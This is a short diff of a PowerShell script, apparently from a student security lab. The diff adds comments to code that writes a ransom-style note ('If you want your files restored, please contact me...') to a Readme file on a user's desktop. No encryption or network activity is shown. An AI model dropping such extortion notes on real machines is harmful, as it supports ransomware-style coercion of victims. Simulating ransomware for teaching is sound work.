@@ -18,10 +18,13 @@ if ( Test-path $outputName ){
     write-host -backgroundcolor "red" -foregroundcolor "White" "$outputName file was not created!"
 }
 
+#Stores the information for the file
 $content = "If you want your files restored, please contact me at email@champlain.edu. I look forward to doing business with you."
 
+#Creates the file and places it in the Home Directory
 $content | Out-File -FilePath 'C:\Users\benhacked.EMUL\Desktop\Readme.READ'
 
+#Checks to see if the file exists
 $outputName2 = "C:\Users\benhacked.EMUL\Desktop\Readme.READ"
 
 if ( Test-path $outputName2 ){
